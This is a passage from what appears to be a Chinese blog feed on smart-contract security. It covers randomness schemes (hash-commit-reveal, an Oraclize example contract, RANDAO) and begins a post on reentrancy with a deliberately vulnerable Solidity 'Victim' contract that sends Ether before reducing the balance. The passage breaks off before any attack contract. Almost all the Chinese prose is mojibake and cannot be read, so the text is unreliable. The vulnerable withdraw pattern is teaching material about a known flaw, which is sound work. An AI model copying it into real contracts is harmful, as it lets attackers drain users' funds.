title="hash-commit-reveal"></a>hash-commit-reveal</h3><p>hash-commit-revealè¢«å¾ˆå¤šåˆçº¦å¼€å‘è€…è§†ä¸ºéšæœºæ•°çš„æœ€ä½³å®è·µæ–¹æ¡ˆï¼Œå·²ç»è¢«å¹¿æ³›åº”ç”¨äºå¤§é‡çš„DAPPä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥çœ‹çœ‹å®ƒçš„å·¥ä½œåŸç†ã€‚</p><p>hash-commit-revealçš„æœ¬è´¨ï¼Œæ˜¯åˆçº¦è°ƒç”¨è€…å’Œéšæœºæ•°æä¾›è€…ï¼ˆé€šå¸¸æƒ…å†µä¸‹æ˜¯æŸå¤–éƒ¨é¢„è¨€æœºï¼‰åœ¨æ³¢åœºåŒºå—é“¾å¹³å°ä¸Šé€šè¿‡ä¸€ç³»åˆ—åè®®æ¥ç”Ÿæˆéšæœºæ•°ã€‚</p><p><a href="https://github.com/dice2-win/contracts/blob/master/Dice2Win.sol">Dice2Win</a>é‡‡ç”¨æ··åˆæ¨¡å¼, å·§å¦™åœ°è§£å†³éšæœºæ•°å¼±, ä¸”å®¹æ˜“è¢«é¢„æµ‹çš„é—®é¢˜. å…¶æ•´ä¸ªæµç¨‹å¦‚ä¸‹:<br>ã€€ã€€<img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/305284-20190417142813698-919642959.png" alt="img"><br>ã€€ã€€<strong>1. ç©å®¶æŒ‡å®šè¡ŒåŠ¨è®¡åˆ’, å¹¶ç”Ÿäº§å¯¹åº”çš„hashå€¼.</strong><br>ã€€ã€€<strong>2. æœåŠ¡ç«¯æ”¶åˆ°ç©å®¶çš„hashå€¼, äº§ç”Ÿéšæœºå€¼reveal, ç„¶åæ ¹æ®revealç”Ÿäº§commitå€¼, æŠŠè¿™ä¸ªè¿”å›ç»™ç©å®¶</strong><br>ã€€ã€€<strong>3. ç©å®¶å¸¦ç€commitå’Œè¡ŒåŠ¨ä¿¡æ¯, åœ¨æ™ºèƒ½åˆçº¦ä¸‹çœŸæ­£ä¸‹æ³¨</strong><br>ã€€ã€€<strong>4. æœåŠ¡ç«¯å‘èµ·ç»“ç®—, å¸¦ç€çœŸæ­£çš„revealå€¼å»ç»“ç®—</strong><br>ã€€ã€€ä¸­é—´çš„è¡ŒåŠ¨è®¡åˆ’å’Œrevealæ²¡æ³•ä¸­é€”ä¿®æ”¹, å› ä¸ºæœ‰hashå€¼çš„éªŒè¯<br>ã€€ã€€å…¶æœ¬è´¨çš„æ€æƒ³æ˜¯<em><strong>hash-commit-reveal</strong></em>, å…¶æ ¸å¿ƒçš„æ€æƒ³æ˜¯: <strong>æœåŠ¡ç«¯ä¸çŸ¥é“ç©å®¶çš„è¡Œä¸º, ç©å®¶ä¸çŸ¥é“æœåŠ¡ç«¯çœŸæ­£çš„éšæœºæ•°</strong>. è€Œæœ€ç»ˆç»“æœåœ¨åˆçº¦é‡ŒéªŒè¯hash, å¹¶ç»™å‡ºé¢„æœŸçš„ç»“æœ. è¿™æ ·çš„æµç¨‹, ä¿è¯ç©å®¶å’ŒæœåŠ¡ç«¯éƒ½æ»¡æ„ã€‚</p><p>æ­¤ç±»éšæœºæ•°ç”Ÿæˆç­–ç•¥çš„ç¼ºç‚¹ä¹Ÿæ˜¯å¾ˆæ˜æ˜¾çš„ï¼šé«˜åº¦ä¾èµ–äºé¢„è¨€æœºï¼ˆ<code>secretSigner</code>ï¼‰å¯¹åˆçº¦çš„å›è°ƒã€‚å› æ­¤ï¼Œé¢„è¨€æœºæœ‰é€‰æ‹©æ€§å›è°ƒçš„ä½œæ¶é£é™©ã€‚</p><h3 id="Oraclize"><a href="#Oraclize" class="headerlink" title="Oraclize"></a>Oraclize</h3><p>Oraclizeå®šä½ä¸ºå»ä¸­å¿ƒåŒ–åº”ç”¨çš„æ•°æ®æ¬è¿å·¥ï¼Œå®ƒä½œä¸ºWeb APIså’ŒDAppçš„å¯é é“¾æ¥ï¼Œæœ‰äº†Oraclizeï¼Œå°±ä¸éœ€è¦å»ºç«‹é¢å¤–çš„ä¿¡ä»»é“¾ï¼Œå› ä¸ºæˆ‘ä»¬çš„è¡Œä¸ºå·²ç»è¢«å¼ºåˆ¶åŠ å¯†éªŒè¯ã€‚</p><p>Oraclize æä¾›äº†ä¸€ä¸ªè¿æ¥ä»¥å¤ªåŠä¸å¤–éƒ¨ç¯å¢ƒ(äº’è”ç½‘)çš„æ¡¥æ¢ã€‚é€šè¿‡ Oraclizeï¼Œæ™ºèƒ½åˆçº¦èƒ½å¤Ÿé€šè¿‡ web API è¯·æ±‚æ•°æ®ã€‚å¦‚å½“å‰çš„å…‘æ¢ç‡ï¼Œå¤©æ°”é¢„æŠ¥æˆ–è‚¡ç¥¨ä»·æ ¼ã€‚å…¶ä¸­ä¸€ä¸ªæœ€å¤§çš„ä½œç”¨æ˜¯èƒ½æä¾›ä¼ªéšæœºæ•°ã€‚ä¸€äº›åˆçº¦é€šè¿‡ Oraclize ä¸­çš„ URL è¿æ¥å™¨æ¥è¿æ¥ <a href="http://random.org/">random.org</a> æ¥è·å–ä¼ªéšæœºæ•°ã€‚</p><p>Oraclizeæ˜¯ä¸€ä¸ªå¯è¯æ˜çš„è¯šå®çš„é¢„è¨€æœºæœåŠ¡ï¼Œå¯ä»¥è®©æ™ºèƒ½åˆçº¦è®¿é—®äº’è”ç½‘ï¼ŒOraclizeæ˜¯å¹³å°æ— å…³çš„ï¼Œä¸ºæ‰€æœ‰ä¸»æµçš„æ™ºèƒ½åˆçº¦å¹³å°æä¾›ä¸€ç§è™šæ‹Ÿçš„æ¥å£ï¼Œé€šè¿‡OraclizeæŠ•å…¥å¤§é‡æœ‰æ„ä¹‰çš„æ•°æ®åˆ°åŒºå—é“¾ä¸­ï¼Œå¯ä»¥ä½¿å¾—æ™ºèƒ½åˆçº¦äº§ä¸šæ›´åŠ ç¹è£ï¼Œè®©æ›´å¤šæœ‰ä»·å€¼çš„åº”ç”¨å‘ˆç°æ›´å¤§çš„ç”Ÿå‘½åŠ›ï¼ŒOraclizeçš„ä½¿ç”¨æ–¹å¼å¯ä»¥å‚è€ƒä¸‹é¢çš„ä»£ç ï¼š</p><p><a href="https://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol">https://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/*<br>   Oraclize random-datasource example<br>   This contract uses the random-datasource to securely generate off-chain N random bytes<br>*/<br><br>pragma solidity ^0.4.11;<br><br>import &quot;github.com/oraclize/ethereum-api/oraclizeAPI.sol&quot;;<br><br>contract RandomExample is usingOraclize &#123;<br>    <br><br>    event newRandomNumber_bytes(bytes);<br>    event newRandomNumber_uint(uint);<br>     <br>    function RandomExample() &#123;<br>        oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof in the constructor<br>        update(); // let&#x27;s ask for N random bytes immediately when the contract is created!<br>    &#125;<br>    <br>    // the callback function is called by Oraclize when the result is ready<br>    // the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:<br>    // the proof validity is fully verified on-chain<br>    function __callback(bytes32 _queryId, string _result, bytes _proof)<br>    &#123; <br>        // if we reach this point successfully, it means that the attached authenticity proof has passed!<br>        if (msg.sender != oraclize_cbAddress()) throw;<br>        <br>        if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) &#123;<br>            // the proof verification has failed, do we need to take any action here? (depends on the use case)<br>        &#125; else &#123;<br>            // the proof verification has passed<br>            // now that we know that the random number was safely generated, let&#x27;s use it..<br>            <br>            newRandomNumber_bytes(bytes(_result)); // this is the resulting random number (bytes)<br>            <br>            // for simplicity of use, let&#x27;s also convert the random bytes to uint if we need<br>            uint maxRange = 2**(8* 7); // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return<br>            uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range<br>            <br>            newRandomNumber_uint(randomNumber); // this is the resulting random number (uint)<br>        &#125;<br>    &#125;<br>    <br>    function update() payable &#123; <br>        uint N = 7; // number of random bytes we want the datasource to return<br>        uint delay = 0; // number of seconds to wait before the execution takes place<br>        uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function<br>        bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è€ƒè™‘ä¸€ä¸ªæä¾›æ‰“èµŒçš„æ™ºèƒ½åˆçº¦ï¼Œç”¨æˆ·è°ƒç”¨æ‰“èµŒçš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä¼šæŠŠç”¨æˆ·çš„è¯·æ±‚å­˜å‚¨èµ·æ¥ï¼Œç„¶åè°ƒç”¨Oracleéšæœºæ•°ç”ŸæˆæœåŠ¡ï¼Œç„¶åé€šè¿‡Oracleå›è°ƒæœåŠ¡ï¼Œåˆ¤æ–­éšæœºæ•°æ˜¯å¦å¤§äºæŸä¸ªå€¼ï¼Œå¦‚æœæˆç«‹ï¼Œé‚£ä¹ˆç”¨æˆ·æˆåŠŸï¼Œå¦åˆ™ç”¨æˆ·å¤±è´¥ï¼Œè¿™å°±æ˜¯å…¸å‹çš„Oracleçš„ä½¿ç”¨æ¡ˆä¾‹ã€‚</p><h3 id="Randao"><a href="#Randao" class="headerlink" title="Randao"></a>Randao</h3><p>RANDAO æœºåˆ¶å°±æ˜¯ï¼Œå½“ç”¨æˆ·é€šè¿‡å‚¨å­˜ï¼ˆè´¨æŠ¼ï¼‰32 ETH æˆä¸ºéªŒè¯è€…ä¹‹åï¼Œè¯¥ç”¨æˆ·å¯ä»¥ä»»æ„é€‰å®šä¸€ä¸ªéšæœºæ•°ã€‚å½“éœ€è¦ä¸ºæŸä¸ªåŒºå—å…¬å¸ƒéšæœºæ•°æ—¶ï¼Œå°†æ‰€æœ‰éªŒè¯è€…çš„éšæœºæ•°åŠ èµ·æ¥å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªå…¨æ–°çš„éšæœºæ•°ã€‚</p><p><a href="https://github.com/randao/randao">randao</a>æ˜¯ä¸€ä¸ªDAO(å»ä¸­å¿ƒåŒ–çš„åŒ¿åç»„ç»‡)å…è®¸ä»»ä½•äººåŠ å…¥ï¼Œéšæœºæ•°ç”±æ‰€æœ‰å‚ä¸è€…ä¸€èµ·åˆä½œç”Ÿæˆï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨åŒºå—é“¾ä¸Šåˆ›å»ºä¸€ä¸ªRANDAOçš„æ™ºèƒ½åˆçº¦ï¼Œåˆçº¦å®šä¹‰äº†å‚ä¸è§„åˆ™ï¼Œç„¶åç”Ÿæˆéšæœºæ•°çš„åŸºæœ¬è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸‹é¢ä¸‰ä¸ªæ­¥éª¤ï¼š</p><p>ç¬¬ä¸€æ­¥ï¼šæ”¶é›†æœ‰æ•ˆçš„sha3(s)ï¼šå‚ä¸éšæœºæ•°ç”Ÿæˆçš„å‚ä¸è€…ï¼Œé¦–å…ˆéœ€è¦åœ¨ä¸€ä¸ªæŒ‡å®šçš„æ—¶é—´åŒºé—´(æ¯”å¦‚6ä¸ªåŒºå—çš„åŒºé—´ï¼Œå¤§çº¦72ç§’)å‘é€m ETHä½œä¸ºæŠµæŠ¼åˆ°æ™ºèƒ½åˆçº¦Cï¼ŒåŒæ—¶å‘é€ä¸€ä¸ªsha3(s)çš„å€¼åˆ°æ™ºèƒ½åˆçº¦C ï¼Œsæ˜¯ä¸€ä¸ªåªæœ‰å‚ä¸è€…è‡ªå·±çŸ¥é“çš„æ•°å­—<br>ç¬¬äºŒæ­¥:æ”¶é›†æœ‰æ•ˆçš„sï¼Œåœ¨ç¬¬ä¸€æ­¥ç»“æŸåï¼Œé‚£äº›æäº¤äº†sha3(s)çš„å‚ä¸è€…éœ€è¦åœ¨æŒ‡å®šçš„æ—¶é—´åŒºé—´å†…å‘é€såˆ°æ™ºèƒ½åˆçº¦Cï¼Œæ™ºèƒ½åˆçº¦Cä¼šæ£€æŸ¥sha3(s)å’Œä¹‹å‰æäº¤çš„å€¼æ˜¯å¦ç›¸åŒï¼Œç›¸åŒçš„sä¼šè¢«ä¿å­˜åˆ°ç§å­é›†åˆç”¨æ¥æœ€ç»ˆç”Ÿæˆéšæœºæ•°ã€‚<br>ç¬¬ä¸‰æ­¥:è®¡ç®—éšæœºæ•°å¹¶é€€å›æŠµæŠ¼å’Œå¥–é‡‘ï¼Œåœ¨æ‰€æœ‰çš„ç§˜å¯†æ•°å­—sè¢«æˆåŠŸæ”¶é›†åï¼Œæ™ºèƒ½åˆçº¦Cä¼šä½¿ç”¨å‡½æ•°f(s1,s2,â€¦,sn)æ¥è®¡ç®—éšæœºæ•°ï¼Œéšæœºæ•°çš„ç»“æœä¼šå†™å…¥æ™ºèƒ½åˆçº¦çš„å­˜å‚¨ï¼Œè€Œä¸”ç»“æœä¼šè¢«å‘é€åˆ°æ‰€æœ‰ä¹‹å‰è¯·æ±‚éšæœºæ•°çš„å…¶ä»–æ™ºèƒ½åˆçº¦ä¸Šé¢ï¼Œæ™ºèƒ½åˆçº¦Cä¼šæŠŠç¬¬ä¸€é˜¶æ®µçš„æŠµæŠ¼è¿”å›ç»™å‚ä¸è€…ï¼Œç„¶åå¥–é‡‘ä¼šè¢«åˆ†æˆåŒç­‰åˆ†å‘é€ç»™æ‰€æœ‰çš„å‚ä¸è€…ï¼Œå¥–é‡‘æ¥æºäºè¯·æ±‚éšæœºå€¼çš„å…¶ä»–æ™ºèƒ½åˆçº¦ã€‚</p><p>RNGè¡¥å……è§„åˆ™ï¼š</p><p>ä¸ºäº†ç¡®ä¿RNGä¸èƒ½è¢«æ“æ§ï¼Œä»¥åŠä¸ºäº†å®‰å…¨å’Œæ•ˆç‡ï¼Œæ™ºèƒ½åˆçº¦Cæœ‰ä»¥ä¸‹çš„è¡¥å……è§„åˆ™ï¼š</p><p>åœ¨ç¬¬ä¸€æ­¥ä¸­ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªæˆ–æ›´å¤šä¸ªçš„åŒæ ·çš„sha3(s)è¢«æäº¤ä¸Šæ¥ï¼Œé‚£ä¹ˆåªæœ‰ç¬¬ä¸€ä¸ªä¼šè¢«æ¥å—<br>åœ¨ç¬¬ä¸€æ­¥ä¸­ï¼Œå¯¹äºå‚ä¸è€…æœ‰æœ€ä½è¦æ±‚ï¼Œå¦‚æœåœ¨æŒ‡å®šæ—¶é—´åŒºé—´å†…æ²¡æœ‰æ”¶é›†åˆ°è¶³å¤Ÿå¤šçš„sha3(s)çš„å€¼ï¼Œé‚£ä¹ˆRNGåœ¨è¿™ä¸ªåŒºå—é«˜åº¦ä¼šå¤±è´¥<br>å¦‚æœå‚ä¸è€…æäº¤äº†sha3(s),é‚£ä¹ˆä»–å¿…é¡»åœ¨ç¬¬äºŒæ­¥æäº¤s<br>å¦‚æœå‚ä¸è€…åœ¨ç¬¬äºŒæ­¥æ²¡æœ‰æäº¤sï¼Œé‚£ä¹ˆç¬¬ä¸€é˜¶æ®µæä¾›çš„m ETHä¼šè¢«æ²¡æ”¶è€Œä¸”æ²¡æœ‰å¥–åŠ±<br>å¦‚æœä¸€ä¸ªæˆ–è€…å¤šä¸ªsæ²¡æœ‰åœ¨ç¬¬äºŒæ­¥è¢«æäº¤ï¼ŒRNGåœ¨è¿™ä¸ªåŒºå—é«˜åº¦ä¼šå¤±è´¥ï¼Œæ²¡æ”¶çš„ETHä¼šè¢«åˆ†æˆåŒç­‰åˆ†å‘é€ç»™æäº¤äº†sçš„å…¶ä»–å‚ä¸è€…ï¼Œå…¶ä»–ç”³è¯·éšæœºæ•°çš„å…¶ä»–åˆçº¦çš„è´¹ç”¨ä¼šè¢«é€€å›</p><p>RNGæ¿€åŠ±æœºåˆ¶ï¼š</p><p>RNGçš„å‘¨æœŸéå¸¸çŸ­ï¼Œä¾‹å¦‚ä¸€ä¸ªå°æ—¶20ä¸ªç”Ÿæˆå‘¨æœŸï¼Œå¦‚æœæ²¡æœ‰å‘¨æœŸçš„åˆ©æ¶¦æ˜¯0.001%,ä¸€ä¸ªæœˆçš„ç›ˆåˆ©ä¼šè¾¾åˆ°0.00001 * 20 * 24 * 30 = 0.144ï¼Œä¸ºäº†è¾¾åˆ°14.4%æ¯ä¸ªæœˆçš„ç›ˆåˆ©ï¼Œå¹¶ä¸”RNGå¹³å‡æœ‰nä¸ªå‚ä¸è€…ï¼Œè¿è¡Œæ™ºèƒ½åˆçº¦Cçš„è´¹ç”¨ä¸ºn * 3 * 500 * gasPrice + Ccostï¼ŒCCostæ˜¯åˆçº¦å†…éƒ¨çš„gasæ¶ˆè´¹ï¼ŒåŒ…æ‹¬è®¡ç®—å’Œå­˜å‚¨)å‡è®¾æ¯ä¸ªéšæœºå€¼å¹³å‡æœ‰rä¸ªè¯·æ±‚ï¼Œæ¯ä¸ªè¯·æ±‚çš„è´¹ç”¨æ˜¯p ETH, é‚£ä¹ˆæ”¶å…¥æ˜¯r*p. æ‰€ä»¥æ¯ä¸ªå‚ä¸è€…æ¯ä¸€æ¬¡å‚ä¸ä¼šæ”¶åˆ°rp - 1500n * gasPrice - Ccost)/n,å½“å‰çš„gasPriceæ˜¯10 szabo, åˆçº¦çš„æ¶ˆè´¹å¤§æ¦‚æ˜¯1500n gasï¼Œ æ‰€ä»¥å¤§æ¦‚çš„å‡€æ”¶å…¥æ˜¯(rp/n-0.03)ETH. å‡è®¾æ¯ä¸ªRNGæœ‰10ä¸ªå‚ä¸è€…ï¼Œå¹¶ä¸”æŠµæŠ¼æ˜¯1000ETHï¼Œæ‰€ä»¥å¦‚æœRNGå¦‚æœåªè¯·æ±‚ä¸€æ¬¡ï¼Œé‚£ä¹ˆä¸€æ¬¡çš„è´¹ç”¨æ˜¯0.4 ETH, å¦‚æœè¯·æ±‚æ˜¯10æ¬¡ï¼Œé‚£ä¹ˆä¸€æ¬¡è¯·æ±‚çš„ä»·æ ¼ä¼šè¢«é™åˆ°0.04ETH</p><p>RANDAOä½œä¸ºä»¥å¤ªåŠç³»ç»Ÿçš„åŸºç¡€è®¾æ–½ï¼Œè¢«å…¶ä»–çš„åˆçº¦è°ƒç”¨ï¼Œä¸åŒçš„åˆçº¦å› ä¸ºæœ‰ä¸åŒçš„ç›®çš„æ‰€ä»¥éœ€è¦ä¸åŒçš„éšæœºå€¼ï¼Œæœ‰äº›éœ€è¦é«˜åº¦åŠ å¯†çš„ï¼Œæ¯”å¦‚è¯´æŠ½å¥–;æœ‰äº›éœ€è¦ç¨³å®šçš„å›åº”ï¼Œå¹¶ä¸”è¦æ±‚ç«‹å³ä½œå‡ºå›åº”,è¿™äº›åˆçº¦æœ¬èº«çš„ä»·å€¼ä¸é«˜;æœ‰äº›éœ€è¦å›è°ƒå‡½æ•°ï¼Œå½“éšæœºå€¼å·²ç»ç”Ÿæˆçš„æ—¶å€™éœ€è¦æ¥æ”¶åˆ°é€šçŸ¥ã€‚</p><p>ä½†å³ä½¿åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€åä¸€ä¸ªå…¬å¼€éšæœºæ•°çš„äººä¹Ÿå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ“çºµéšæœºæ•°ã€‚æœ€åä¸€ä¸ªäººå¯ä»¥é€‰æ‹©ä¿æŒæ²‰é»˜ï¼Œä»¥è¿™æ ·æˆ–é‚£æ ·çš„æ–¹å¼æ”¹å˜è¿™ä¸ªæœ€ç»ˆçš„éšæœºæ•°ï¼šæˆ¿é—´é‡Œçš„æœ€åä¸€ä¸ªäººå¯ä»¥è®°ä½ä¹‹å‰æ¯ä¸ªäººå…¬å¸ƒçš„æ•°å­—ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œå°±å¯ä»¥çŸ¥é“åŠ ä¸Šï¼ˆæˆ–è€…ä¸åŠ ä¸Šï¼‰ä»–æä¾›çš„æ•°å­—ä¹‹åçš„æœ€ç»ˆéšæœºæ•°ç»“æœã€‚å¦‚æœç›¸å¯¹äºå…¶ä»–æ•°å­—ï¼ŒæŸä¸ªæ•°å­—å¯¹æœ€åä¸€ä¸ªäººæ›´æœ‰åˆ©ï¼Œé‚£æœ€åä¸€ä¸ªäººå°±æœ‰åŠ¨æœºå»è¿›è¡ŒæŸç§ç¨‹åº¦çš„æ“çºµï¼Œä¸ç®¡ç¨‹åº¦é«˜ä½ã€‚</p><p>å¯¹äºè¿™ä¸€é—®é¢˜ï¼Œä»¥å¤ªåŠ 2.0 å°†é€šè¿‡ VDFï¼ˆå¯éªŒè¯å»¶è¿Ÿå‡½æ•°ï¼‰æ¥è§£å†³ï¼</p><p>â€¦â€¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ™ºèƒ½åˆçº¦é‡å…¥æ¼æ´</title>
    <link href="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘ï¼š<a href="https://forum.butian.net/share/878">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº</a></p><p>é‡â¼Šæ”»å‡»ï¼Œå¯èƒ½æ˜¯æœ€ç€åçš„ä»¥å¤ªåŠæ¼æ´ã€‚åˆçº¦åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨äº†å±é™©çš„å‡½æ•°ï¼Œå¹¶ä¸”ä½¿ç”¨ä¸å®‰å…¨çš„äº¤äº’æ¨¡å¼ã€‚ä¸¤è€…å åŠ åœ¨ä¸€èµ·é€ å°±äº†ä»¥å¤ªåŠéå¸¸ç»å…¸çš„é‡å…¥æ¼æ´ã€‚å…¶ä¸­æœ€æœ‰ä»£è¡¨æ€§çš„æ”»å‡»æ˜¯ <a href="https://en.wikipedia.org/wiki/The_DAO_(organization)">The DAO</a></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>å¤–éƒ¨æ¶æ„åˆçº¦å›è°ƒäº†å—æ”»å‡»åˆçº¦ä¸Šçš„ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶åœ¨å—æ”»å‡»åˆçº¦ä¸Šçš„ä»»æ„ä½ç½®â€œé‡æ–°è¿›å…¥â€ä»£ç æ‰§è¡Œã€‚å› ä¸ºåŸåˆçº¦çš„ç¨‹åºå‘˜å¯èƒ½æ²¡æœ‰é¢„æ–™åˆ°åˆçº¦ä»£ç å¯ä»¥è¢«â€é‡å…¥â€œï¼Œå› æ­¤åˆçº¦ä¼šå‡ºç°ä¸å¯é¢„çŸ¥çš„è¡Œä¸ºã€‚åœ¨ gas è¶³å¤Ÿçš„æƒ…å†µä¸‹ï¼Œåˆçº¦ä¹‹é—´ç”šè‡³å¯ä»¥ç›¸äº’å¾ªç¯è°ƒç”¨ï¼Œç›´è‡³è¾¾åˆ° gas çš„ä¸Šé™ï¼Œä½†æ˜¯å¦‚æœå¾ªç¯ä¸­æœ‰è½¬è´¦ä¹‹ç±»çš„æ“ä½œï¼Œå°±ä¼šå¯¼è‡´ä¸¥é‡çš„åæœã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint _amount) public &#123;<br>require(balances[msg.sender] &gt;= _amount)<br>msg.sender.call.value(_amount)();<br>balances[msg.sender] -= _amount;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211025202430311.png" alt="image-20211025202430311"></p><p>å…¶ä¸­ï¼Œ<code>fallback</code>å‡½æ•°æ˜¯å…³é”®</p><h3 id="fallbackå‡½æ•°"><a href="#fallbackå‡½æ•°" class="headerlink" title="fallbackå‡½æ•°"></a>fallbackå‡½æ•°</h3><p>å½“æˆ‘ä»¬è°ƒç”¨æŸä¸ªæ™ºèƒ½åˆçº¦æ—¶ï¼Œå¦‚æœæŒ‡å®šçš„å‡½æ•°æ‰¾ä¸åˆ°ï¼Œæˆ–è€…æ ¹æœ¬å°±æ²¡æŒ‡å®šè°ƒç”¨å“ªä¸ªå‡½æ•°ï¼ˆå¦‚å‘åˆçº¦å‘é€ etherï¼‰æ—¶ï¼Œ<code>fallback</code> å‡½æ•°å°±ä¼šè¢«è°ƒç”¨ã€‚</p><p>å‘åˆçº¦å‘é€ sendã€transferã€call æ¶ˆæ¯æ—¶å€™éƒ½ä¼šè°ƒç”¨ <code>fallback</code> å‡½æ•°ï¼Œä¸åŒçš„æ˜¯ send å’Œ transfer æœ‰ 2300 gas çš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯ä¼ é€’ç»™ <code>fallback</code> çš„åªæœ‰ 2300 gasï¼Œè¿™ä¸ª gas åªèƒ½ç”¨äºè®°å½•æ—¥å¿—ï¼Œå› ä¸ºå…¶ä»–æ“ä½œéƒ½å°†è¶…è¿‡ 2300 gasã€‚ä½† call åˆ™ä¼šæŠŠå‰©ä½™çš„æ‰€æœ‰ gas éƒ½ç»™ <code>fallback</code> å‡½æ•°ï¼Œè¿™æœ‰å¯èƒ½å¯¼è‡´å¾ªç¯è°ƒç”¨ã€‚</p><p>è€Œ<code>fallback</code>å‡½æ•°æ˜¯å¯ä»¥è¢«é‡å†™çš„</p><p>å¦‚æœæ„é€ ä¸€ä¸ª <code>fallback</code> å‡½æ•°ï¼Œå‡½æ•°é‡Œé¢ä¹Ÿè°ƒç”¨å¯¹æ–¹çš„ <code>withdraw</code> å‡½æ•°çš„è¯ï¼Œé‚£å°†ä¼šäº§ç”Ÿä¸€ä¸ªå¾ªç¯è°ƒç”¨è½¬è´¦åŠŸèƒ½ï¼Œå­˜åœ¨æ¼æ´çš„åˆçº¦ä¼šä¸æ–­å‘æ”»å‡»è€…åˆçº¦è½¬è´¦ï¼Œç»ˆæ­¢å¾ªç¯ç»“æŸï¼ˆä»¥å¤ªåŠ gas æœ‰ä¸Šé™ï¼‰</p><h2 id="æ¼æ´demo"><a href="#æ¼æ´demo" class="headerlink" title="æ¼æ´demo"></a>æ¼æ´demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br>contract Victim &#123;<br>mapping(address =&gt; uint) public balances;<br>address public owner;<br>    <br>    //æ„é€ å‡½æ•°ï¼Œè®¾å®šåˆçº¦æ‰€æœ‰è€…<br>    constructor() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>//æ¥æ”¶èµ„é‡‘è½¬å…¥<br>function deposit() public payable &#123;<br>balances[msg.sender] += msg.value;<br>&#125;<br><br>//ææ¬¾<br>function withdraw(uint _amount) public &#123;<br>require(balances[msg.sender] &gt;= _amount);<br>msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>balances[msg.sender] -= _amount;<br>&#125;<br><br>//æŸ¥è¯¢ä½™é¢<br>function getBalance() public view returns(uint) &#123;<br>return address(this).balance;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 